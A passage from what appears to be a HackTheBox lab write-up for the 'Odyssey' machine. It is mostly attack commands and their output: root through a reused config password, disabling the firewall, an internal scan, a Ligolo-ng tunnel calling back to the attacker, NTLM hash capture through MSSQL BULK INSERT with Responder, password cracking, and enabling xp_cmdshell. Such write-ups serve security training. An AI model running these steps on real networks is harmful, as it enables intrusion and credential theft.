  password: process.env.AEGIS_SQL_PASS || 'opc0932k90%%lODFI93-++',
  server: process.env.AEGIS_SQL_HOST || '172.16.0.11',
  database: process.env.AEGIS_SQL_DB || 'aegis',
  port: parseInt(process.env.AEGIS_SQL_PORT || '1433', 10),
  connectionTimeout: 8000,
  requestTimeout: 15000,
  pool: { max: 10, min: 0, idleTimeoutMillis: 30000 },
  options: {
    encrypt: false,
    trustServerCertificate: true,
    enableArithAbort: true,
  },
};
...
```

The default values expose a database username, password, and internal database host. Since we already have access as `webadmin`, the next step is to check what privileges this account has on the operating system. Examining the user's group membership shows that `webadmin` belongs to the `sudo` group. This makes the recovered password particularly interesting, as it may also be the user's local password. We can therefore test the discovered credential with `sudo` to determine whether it can be reused for privilege escalation and potentially obtain a root shell.

```shell
webadmin@odyssey-web:~/aegis/db$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<db$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```shell
webadmin@odyssey-web:~/aegis/db$ sudo su
sudo su
[sudo: authenticate] Password: opc0932k90%%lODFI93-++ 
                      
root@odyssey-web:/home/webadmin/aegis/db# 
```

Now we're root!!

```shellscript
root@odyssey-web:/etc# systemctl status ssh --no-pager
systemctl status ssh --no-pager
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/usr/lib/systemd/system/ssh.service; enabled; preset: enabled)
     Active: active (running) since Tue 2026-09-15 16:43:15 UTC; 28s ago
 Invocation: d40feeea370040be801e97d235826872
TriggeredBy: ● ssh.socket
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 12180 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 12185 (sshd)
      Tasks: 1 (limit: 1736)
     Memory: 1.6M (peak: 2.5M)
        CPU: 27ms
     CGroup: /system.slice/ssh.service
             └─12185 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"

Sep 15 16:43:14 odyssey-web systemd[1]: Starting ssh.service - OpenBSD Secu…r...
Sep 15 16:43:15 odyssey-web sshd[12185]: Server listening on 0.0.0.0 port 22.
Sep 15 16:43:15 odyssey-web sshd[12185]: Server listening on :: port 22.
Sep 15 16:43:15 odyssey-web systemd[1]: Started ssh.service - OpenBSD Secur…ver.
Hint: Some lines were ellipsized, use -l to show in full.
```

I noticed that the SSH is active here, it suggests that access to the service may have previously been restricted by firewall rules. To avoid the firewall interfering with our subsequent network-based operations, we disable UFW entirely and remove it as a potential source of connectivity issues.

```shellscript
root@odyssey-web:/etc# ufw disable
ufw disable
Firewall stopped and disabled on system startup
```

## Coercing Queries Through BULK INSERT

During further enumeration, I discovered another environment configuration file at `/etc/aegis-render.env`. This file contains the configuration for the AEGIS notice-rendering service, including credentials used to access its MSSQL database:

```shell
root@odyssey-web:/etc# cat aegis-render.env
cat aegis-render.env
# AEGIS Notice Renderer service environment
# Provisioned per ICR-2024-0142 (render isolation) and Sov-Sec-19 (signing-side hardening).
# Audit-publisher principal: elevated rights for writing render attestations.
AEGIS_RENDER_DB_USER=aegis_audit_publisher
AEGIS_RENDER_DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
AEGIS_RENDER_DB_HOST=172.16.0.11
AEGIS_RENDER_DB_DB=aegis_audit
AEGIS_RENDER_DB_PORT=1433
AEGIS_RENDER_TMP=/var/lib/aegis-render/jobs
AEGIS_RENDER_OUT=/var/lib/aegis-render/out
AEGIS_RENDER_PANDOC=/usr/bin/pandoc
AEGIS_RENDER_GS=/usr/bin/gs
AEGIS_RENDER_TIMEOUT_MS=20000
```

The important finding here is the `AEGIS_RENDER_DB_USER` and `AEGIS_RENDER_DB_PASS` values, which provide another set of database credentials. The configuration also reveals the internal MSSQL server at `172.16.0.11` and the `aegis_audit` database, while the remaining variables identify the renderer's temporary and output directories and the locations of its Pandoc and Ghostscript binaries. These details give us another potential avenue for accessing the internal database and investigating what privileges are associated with the `aegis_audit_publisher` account.

Let's check the network configuration here:

```shell
root@odyssey-web:/tmp# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.0.12  netmask 255.255.255.0  broadcast 172.16.0.255
        inet6 fe80::215:5dff:fe01:4205  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:01:42:05  txqueuelen 1000  (Ethernet)
        RX packets 316780  bytes 41143841 (41.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 265894  bytes 475082648 (475.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3138  bytes 552308 (552.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3138  bytes 552308 (552.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

The output shows that the compromised machine has the address `172.16.0.12/24` on `eth0`. The `/24` netmask means the host is part of the `172.16.0.0/24` subnet, giving us a potential range of internal addresses from `172.16.0.1` through `172.16.0.254`. The `lo` interface is the standard loopback interface at `127.0.0.1` and is only used for local communication. The important finding here is that the compromised host has direct access to an internal network that was not visible from our original external enumeration.

With the internal subnet identified, we use `fscan` to discover other hosts and services:

```shell
root@odyssey-web:/tmp# ./fscan -h 172.16.0.0/24 -o result.txt               
./fscan -h 172.16.0.0/24 -o result.txt
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan 2.2.1 (95cc12e 2026-08-25T20:44:10Z)
                                                                                                                               
[*] 服务插件: netbios, memcached, rsync, mqtt, mysql ... 等36个                                                                
[*] 172.16.0.12 存活 (协议: ICMP)
[*] 172.16.0.10 存活 (协议: ICMP)
[*] 172.16.0.11 存活 (协议: ICMP)
[*] ICMP响应率过低(1.2%)，启用TCP补充探测(251个主机)
[*] 参数自适应: Timeout=1000ms, ModuleThread=5, Retry=6, ICMPRate=0.05, PocNum=5
[*] 172.16.0.12:22                 ssh      [Product:OpenSSH ||Version:10.2p1 Ubuntu 2ubuntu3.2] Banner:(SSH-2.0-OpenSSH_10.2p1 Ubuntu-2ubuntu3.2)                                                                                                            
[*] 172.16.0.10:445                microsoft-ds [Product:Microsoft Windows SMB2] Banner:(SMB@ A / 2 L .kIwO oE x `v + l0j <0: + 7 * H * H * H + 7 *0( & $not_defined_in_R...)                                                                                 
[-] 插件扫描错误 172.16.0.10:445 - 目标可能不支持SMBv1
[+] SMBInfo 172.16.0.10:445 [Windows 11 (Build 26100)] DC01 SMBv2
[*] 172.16.0.11:1433               ms-sql-s [Product:Microsoft SQL Server 2008 ||Version:10.00.5500; SP3] Banner:(%)
[-] 172.16.0.11:1433 mssql 未发现弱密码
[*] 172.16.0.10:88                 spark    [Product:Apache Spark]
[*] http://172.16.0.10:139         http     [Product:Open Lighting Architecture daemon]
[-] 插件扫描错误 172.16.0.10:139 - 读取SMB Session Setup响应失败: EOF
[-] 插件扫描错误 172.16.0.10:139 - SMB协议探测失败: 读取SMBv2协商响应失败: 消息长度过大: 2197815297
[*] 172.16.0.10:389                genetec-5400 [Product:Genetec Security Center] Banner:(0 d 0 0 domainFunctionality1 100 forestFunctionality1 100 ) domainControllerFunc...)                                                         
```

The `-h` option specifies the target range, while `-o result.txt` saves the discovered information to a file for later analysis. The scan identifies three active hosts: `172.16.0.12`, our current machine, `172.16.0.10`, and `172.16.0.11`. The results reveal a significant difference between the two internal systems. `172.16.0.10` exposes numerous Windows/Active Directory-related services, including SMB on `445`, Kerberos on `88`, LDAP on `389`, LDAPS on `636`, RPC on `135`, and WinRM on `5985`. This strongly suggests that it is a domain controller or another important Windows infrastructure host. Meanwhile, `172.16.0.11` exposes MSSQL on port `1433` and WinRM on `5985`, matching the database server information discovered earlier in the application configuration.

```shell
root@odyssey-web:/tmp# cat result.txt
cat result.txt
# ===== 存活主机 =====
172.16.0.12
172.16.0.10
172.16.0.11

# ===== 开放端口 =====
172.16.0.10:445
172.16.0.12:22
172.16.0.11:1433
172.16.0.10:53
172.16.0.10:88
172.16.0.10:139
172.16.0.10:135
172.16.0.10:389
172.16.0.10:636
172.16.0.12:3000
172.16.0.10:3000
172.16.0.10:3268
172.16.0.10:3269
172.16.0.10:5985
172.16.0.11:5985

# ===== 服务信息 =====
172.16.0.12:22 ssh SSH-2.0-OpenSSH_10.2p1 Ubuntu-2ubuntu3.2
172.16.0.10:445 microsoft-ds SMB@ A / 2 L .kIwO oE x `v + l0j <0: + 7 * H * H * H + 7 *0( & $not_defined_in_RFC4178@please_ignore
172.16.0.11:1433 ms-sql-s %
172.16.0.10:88 spark
http://172.16.0.10:139
172.16.0.10:389 genetec-5400 0 d 0 0 domainFunctionality1 100 forestFunctionality1 100 ) domainControllerFunctionality1 100 2 roo...
172.16.0.10:53 domain version bind
172.16.0.10:135 msrpc @
172.16.0.10:3268 genetec-5400 0 d 0 0 domainFunctionality1 100 forestFunctionality1 100 ) domainControllerFunctionality1 100 2 roo...
http://172.16.0.12:3000 301 [expressjs]
http://172.16.0.10:3000 301 [expressjs]
http://172.16.0.10:5985 [Not Found] 404 Microsoft-HTTPAPI/2.0
http://172.16.0.11:5985 [Not Found] 404 Microsoft-HTTPAPI/2.0
172.16.0.10:3269 ssl s M j d: 't Xb/ qLDOWNGRD i6 ~ ' ( 3 *G \` [l H } / 0 0 " - Cg P 0 * H 0@1 0 U KR1 0 U Directorate 9...
172.16.0.10:636 ssl R F j w A BV G <hDOWNGRD R L m !B x !) qi8 5 0 0 " - Cg P 0 * H 0@1 0 U KR1 0 U Directorate 91 0 U D...

# ===== Web服务 =====
http://172.16.0.10:139
http://172.16.0.12:3000
http://172.16.0.10:3000
http://172.16.0.10:5985
http://172.16.0.11:5985
```

This displays the information collected by `fscan` in a more convenient form. Besides confirming the live hosts and open ports, the output provides service fingerprints such as OpenSSH on `172.16.0.12`, Microsoft SQL Server on `172.16.0.11`, and multiple Active Directory services on `172.16.0.10`. The scan also identifies HTTP services on port `3000` and confirms that the AEGIS application is reachable internally. At this point, the network layout becomes much clearer: the compromised Linux host sits at `172.16.0.12`, the SQL server is at `172.16.0.11`, and `172.16.0.10` exposes the core Windows/AD infrastructure. This gives us a useful map for the next stage of lateral movement and credential testing.

To access the internal `172.16.0.0/24` network from our attacking machine, we set up a tunnel using `Ligolo-ng`.

First, we create a TUN interface:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ sudo ip tuntap add user kuroshiro mode tun ligolo
```

the `ip tuntap add` command creates a virtual network interface named `ligolo`. The `mode tun` option makes it a Layer 3 TUN interface, which allows IP traffic to be routed through the tunnel. The `user kuroshiro` option gives the specified local user ownership of the interface, allowing Ligolo-ng to interact with it without requiring every operation to run as root.&#x20;

Next, we bring the newly created interface online.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ sudo ip link set ligolo up
```

Creating the interface does not automatically make it active. This command changes its state to `UP`, allowing the operating system to use it for network traffic.

We then add a route for the internal subnet:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ sudo ip route add 172.16.0.0/24 dev ligolo
```

This tells our attacking machine that traffic destined for `172.16.0.0/24` should be sent through the `ligolo` interface. The route is important because the internal network is only reachable through the compromised Odyssey host; without it, our machine would have no reason to send packets for that subnet through the tunnel.

With the local routing configured, we start the Ligolo-ng proxy:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ sudo ligolo-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                   
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                   
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                    
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                     
        /____/                          /____/                                                                      
                                                                                                                    
  Made in France ♥            by @Nicocha30!                                                                        
  Version: dev                                                                                                      
                                                                                                                    
ligolo-ng » 
```

The proxy acts as the server-side component of the tunnel on our attacking machine. The `-selfcert` option allows it to generate and use a self-signed certificate rather than requiring a certificate from a public CA.

On the compromised host, we then launch the Ligolo-ng agent:

```shell
root@odyssey-web:/tmp# nohup ./agent -connect 10.10.14.32:11601 -ignore-cert >/dev/null 2>&1 & disown
```

Here, `nohup` allows the agent to continue running after the terminal session is closed. `./agent` executes the Ligolo-ng agent, while `-connect 10.10.14.32:11601` tells it to connect back to our attacking machine on port `11601`. The `-ignore-cert` option skips certificate verification, which is appropriate here because the proxy is using a self-signed certificate. Output is redirected to `/dev/null`, and `&` places the process in the background; `disown` then removes it from the shell's job list.

Once the connection succeeds, the proxy reports that the agent has joined:

```shell
ligolo-ng » INFO[0807] Agent joined.                                 id=00155d014205 name=root@odyssey-web remote="10.129.45.209:61272"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - root@odyssey-web - 10.129.45.209:61272 - 00155d014205
[Agent : root@odyssey-web] » start
INFO[0815] Starting tunnel to root@odyssey-web (00155d014205)
```

The resulting message confirms that the tunnel has been established. At this point, traffic sent through the `ligolo` interface toward `172.16.0.0/24` can traverse the compromised Odyssey host and reach the previously inaccessible internal network, allowing us to enumerate and interact with the discovered Windows and SQL infrastructure from our attacking machine.

With the internal tunnel working, we can move on to enumerating the Active Directory environment. We start by checking the internal subnet for SMB services using `NetExec`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc smb 172.16.0.0/24
SMB         172.16.0.10     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:odyssey.htb) (signing:True) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

NetExec scans the specified `/24` network for SMB and identifies `172.16.0.10` as `DC01`. The output reveals that the host belongs to the `odyssey.htb` domain and has SMB signing enabled while SMBv1 is disabled. The domain information is particularly useful because it confirms the Active Directory naming structure and gives us the hostname of the domain controller.

We then check for WinRM across the same subnet:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc winrm 172.16.0.0/24

WINRM       172.16.0.10     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:odyssey.htb)
WINRM       172.16.0.11     5985   ODYSSEY-DB       [*] Windows 11 / Server 2025 Build 26100 (name:ODYSSEY-DB) (domain:odyssey.htb)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

This identifies WinRM on both `172.16.0.10` (`DC01`) and `172.16.0.11` (`ODYSSEY-DB`). WinRM is important because it can provide remote command execution on Windows systems when valid credentials are available. At this point, we have identified both the domain controller and the database server as potential targets.

To avoid repeatedly scanning the entire subnet, we place the discovered internal hosts into a file:

```
172.16.0.10
172.16.0.11
172.16.0.12
```

We can then use this file as the target list for additional NetExec checks. First, we verify SMB again:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc smb internal.txt 
SMB         172.16.0.10     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:odyssey.htb) (signing:True) (SMBv1:False)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

This confirms that `172.16.0.10` is the SMB-enabled domain controller. Next, we enumerate WinRM:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc winrm internal.txt
WINRM       172.16.0.10     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:odyssey.htb)
WINRM       172.16.0.11     5985   ODYSSEY-DB       [*] Windows 11 / Server 2025 Build 26100 (name:ODYSSEY-DB) (domain:odyssey.htb)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

The results again show WinRM exposed on both `DC01` and `ODYSSEY-DB`. We also check WMI/RPC:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc wmi internal.txt
RPC         172.16.0.10     135    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:odyssey.htb)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Here, `172.16.0.10` responds on RPC port `135`, confirming that the domain controller exposes WMI-related functionality. Finally, we check for Microsoft SQL Server:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc mssql internal.txt
MSSQL       172.16.0.11     1433   ODYSSEY-DB       [*] Windows 11 / Server 2025 Build 26100 (name:ODYSSEY-DB) (domain:odyssey.htb)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

This identifies `172.16.0.11` as `ODYSSEY-DB` with MSSQL listening on port `1433`. This is consistent with the database credentials and server address discovered earlier in the Linux application configuration.

To make name resolution easier during the next stages, we add the discovered hosts to `/etc/hosts`:

```plaintext
172.16.0.10     DC01.odyssey.htb DC01 odyssey.htb
172.16.0.11     ODYSSEY-DB.odyssey.htb ODYSSEY-DB
```

This maps the internal IP addresses to their corresponding hostnames and the `odyssey.htb` domain. This is useful because many Windows and Active Directory tools work more reliably when the target's hostname and domain can be resolved locally rather than relying solely on IP addresses.

The next step is to reuse the database credentials discovered earlier in `/etc/aegis-render.env`. Since the configuration identified `aegis_audit_publisher` as the MSSQL account for `ODYSSEY-DB`, we first verify whether those credentials are valid:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc mssql ODYSSEY-DB.odyssey.htb -u aegis_audit_publisher -p 'Rxd!Qw6n8sP..2bJ@Wpx-2026' --local-auth
MSSQL       172.16.0.11     1433   ODYSSEY-DB       [*] Windows 11 / Server 2025 Build 26100 (name:ODYSSEY-DB) (domain:odyssey.htb)
MSSQL       172.16.0.11     1433   ODYSSEY-DB       [+] ODYSSEY-DB\aegis_audit_publisher:Rxd!Qw6n8sP..2bJ@Wpx-2026 
```

The successful `[+]` result confirms that the credentials are valid and that the account exists as&#x20;

We can then interact directly with the database using `Impacket's MSSQL` client:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ impacket-mssqlclient aegis_audit_publisher:'Rxd!Qw6n8sP..2bJ@Wpx-2026'@ODYSSEY-DB.odyssey.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: aegis_audit
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(odyssey-db): Line 1: Changed database context to 'aegis_audit'.
[*] INFO(odyssey-db): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)>
```

The client establishes a connection to the MSSQL server using the supplied credentials. The output shows that TLS encryption is enabled and that the session is automatically placed in the `aegis_audit` database. Before attempting anything further, we check the account's server-level privileges:

```shell
SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin
is_sysadmin   
-----------   
          0   
```

The result is `0`, meaning the account is **not** a SQL Server administrator. We then check whether it belongs to the `bulkadmin` fixed server role:

```shellscript
SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)> SELECT IS_SRVROLEMEMBER('bulkadmin') AS is_bulkadmin
is_bulkadmin   
------------   
           1 
```

This returns `1`, confirming that the account has `bulkadmin` privileges. This is significant because `BULK INSERT` can cause SQL Server to access a file path from the database server's perspective. We therefore test this behavior by referencing an SMB share hosted on our attacking machine:

```shellscript
SQL (aegis_audit_publisher aegis_audit_publisher@aegis_audit)> EXEC ('BULK INSERT aegis_audit.dbo.audit_ingest_staging FROM ''\172.16.0.12\lala'' WITH (DATAFILETYPE = ''char'')');
```

Instead of providing an ordinary local file, the `FROM` path points to `\\172.16.0.12\lala`, an SMB share controlled by us. When SQL Server attempts to access that remote resource, the Windows service account running MSSQL may authenticate to the SMB server automatically. This gives us an opportunity to capture an NTLMv2 challenge-response.

On the attacking machine, we start Responder on the tunnel interface. Once the SQL Server attempts to access our SMB share, Responder receives an authentication request and captures an NTLMv2 challenge-response belonging to `ODYSSEY\svc-mssql`. The important discovery is that the MSSQL service is running under the `svc-mssql` domain account, rather than the low-privileged database account we initially used.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0 -wd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

....

[+] Listening for events...                                                                                         

[SMB] NTLMv2-SSP Client   : 10.10.14.32
[SMB] NTLMv2-SSP Username : ODYSSEY\svc-mssql
[SMB] NTLMv2-SSP Hash     : svc-mssql::ODYSSEY:446801c92664f093:A87924085E9A2B1F4971AD97CB1398A9:010100000000000080C83EBB152DDD012D7843696BE9A8CE0000000002000800560048003300380001001E00570049004E002D0044004200310044005200450045004E0051003400480004003400570049004E002D0044004200310044005200450045004E005100340048002E0056004800330038002E004C004F00430041004C000300140056004800330038002E004C004F00430041004C000500140056004800330038002E004C004F00430041004C000700080080C83EBB152DDD01060004000200000008005000500000000000000000000000003000007CAAC4739E91900E21FAB2F2B6E0B30A8008F57F3C934153CFE03FBCFCBE2B1238322003336C120C946DA95D6DAAB7E228F610EB840BF3200E7F212527B065F30A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0030002E00310032000000000000000000
```

The captured NetNTLMv2 response can then be saved to a file and subjected to offline password cracking:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /home/kuroshiro/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cml958782        (svc-mssql)     
1g 0:00:00:07 DONE (2026-09-15 21:11) 0.1257g/s 1135Kp/s 1135Kc/s 1135KC/s cmoglover..cmjb12
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

John the Ripper loads the captured `netntlmv2` hash and tests candidate passwords from `rockyou.txt`. In this case, the password is successfully recovered as `cml958782`, associated with the `svc-mssql` account. We have therefore progressed from the database credentials discovered in the application configuration to a separate domain service account by abusing the SQL Server's ability to authenticate to an attacker-controlled SMB resource.

After recovering the `svc-mssql` credentials, the next step is to determine where this account can authenticate and what level of access it has within the domain. We first test SMB access against the domain controller:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc smb DC01.odyssey.htb -u svc-mssql -p cml958782
SMB         172.16.0.10     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:odyssey.htb) (signing:True) (SMBv1:False)
SMB         172.16.0.10     445    DC01             [+] odyssey.htb\svc-mssql:cml958782
```

The successful result confirms that `odyssey.htb\svc-mssql` is a valid domain account and can authenticate to `DC01` over SMB. We then test WMI/RPC access:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc wmi DC01.odyssey.htb -u svc-mssql -p cml958782
RPC         172.16.0.10     135    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:odyssey.htb)
RPC         172.16.0.10     135    DC01             [+] odyssey.htb\svc-mssql:cml958782 
```

This also succeeds, showing that the account has access to the domain controller's WMI/RPC interface. Next, we use LDAP enumeration to retrieve domain users:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc ldap DC01.odyssey.htb -u svc-mssql -p cml958782 --users-export users.txt 
LDAP        172.16.0.10     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:odyssey.htb)
LDAPS       172.16.0.10     636    DC01             [+] odyssey.htb\svc-mssql:cml958782 
LDAPS       172.16.0.10     636    DC01             [*] Enumerated 11 domain users: odyssey.htb
LDAPS       172.16.0.10     636    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                                                        
LDAPS       172.16.0.10     636    DC01             Administrator                 2026-04-28 05:47:41 63       Built-in account for administering the computer/domain                                                                               
LDAPS       172.16.0.10     636    DC01             Guest                         <never>             73       Built-in account for guest access to the computer/domain                                                                             
LDAPS       172.16.0.10     636    DC01             krbtgt                        2026-04-28 06:38:14 0        Key Distribution Center Service Account                                                                                              
LDAPS       172.16.0.10     636    DC01             svc-mssql                     2026-05-07 05:03:14 0                   
LDAPS       172.16.0.10     636    DC01             svc-aegis-build               2026-05-07 11:49:59 0        Build pipeline service identity. Workflow-managed (D9-PIPE-37).                                                                      
LDAPS       172.16.0.10     636    DC01             svc-aegis-deploy              2026-05-07 20:21:51 0        Aegis pipeline deploy-stage service                                                                                                  
LDAPS       172.16.0.10     636    DC01             svc-aegis-stream              2026-05-08 15:49:27 0        Sov-Sec-22 streaming-attestation aggregator service identity (D9-PIPE-37).                                                           
LDAPS       172.16.0.10     636    DC01             svc-aegis-watch               2026-05-08 15:49:27 0        Sov-Sec-22 stream-aggregator integrity watchdog service identity (D9-PIPE-37).                                                       
LDAPS       172.16.0.10     636    DC01             ao-mreyes                     2026-05-08 15:49:27 0        Authorising Officer â€” Senior. AEGIS / Aegis Stream operations.                                                                     
LDAPS       172.16.0.10     636    DC01             ao-jchen                      2026-05-08 15:49:27 0        Authorising Officer. AEGIS pipeline review.                                                                                          
LDAPS       172.16.0.10     636    DC01             ao-tnemec                     2026-05-08 15:49:27 0        Authorising Officer. AEGIS audit-stream review.                                                                                      
LDAPS       172.16.0.10     636    DC01             [*] Writing 11 local users to users.txt
```

The command authenticates to LDAP/LDAPS and enumerates the domain's user objects, finding 11 accounts. The resulting list includes built-in accounts such as `Administrator`, `Guest`, and `krbtgt`, the compromised `svc-mssql` account, several AEGIS service accounts, and authorizing-officer accounts.&#x20;

## SYSTEM-Level Access on Odyssey-DB

We also test the same credentials against the database server:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc mssql ODYSSEY-DB.odyssey.htb -u svc-mssql -p 'cml958782'
MSSQL       172.16.0.11     1433   ODYSSEY-DB       [*] Windows 11 / Server 2025 Build 26100 (name:ODYSSEY-DB) (domain:odyssey.htb)
MSSQL       172.16.0.11     1433   ODYSSEY-DB       [+] odyssey.htb\svc-mssql:cml958782 (Pwn3d!)
```

The authentication succeeds, and NetExec reports `(Pwn3d!)`, indicating that the account has a high level of MSSQL access. To interact with the database directly using domain authentication, we connect with Impacket:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ impacket-mssqlclient ODYSSEY/svc-mssql:'cml958782'@ODYSSEY-DB.odyssey.htb -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(odyssey-db): Line 1: Changed database context to 'master'.
[*] INFO(odyssey-db): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (ODYSSEY\svc-mssql  dbo@master)> 
```

The `-windows-auth` option tells the client to authenticate using Windows/domain credentials instead of SQL authentication. Once connected, we enable `xp_cmdshell`:

```shell
SQL (ODYSSEY\svc-mssql  dbo@master)> enable_xp_cmdshell
INFO(odyssey-db): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(odyssey-db): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

This enables SQL Server's `xp_cmdshell` functionality, which allows SQL queries to execute operating-system commands through the SQL Server service account. We verify the execution context with:

```shellscript
SQL (ODYSSEY\svc-mssql  dbo@master)> xp_cmdshell whoami
output              
-----------------   
odyssey\svc-mssql   

NULL    
```

The result is `odyssey\svc-mssql`, confirming that commands executed through `xp_cmdshell` run under the `svc-mssql` Windows account. Finally, we inspect its Windows privileges:

```shellscript
SQL (ODYSSEY\svc-mssql  dbo@master)> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

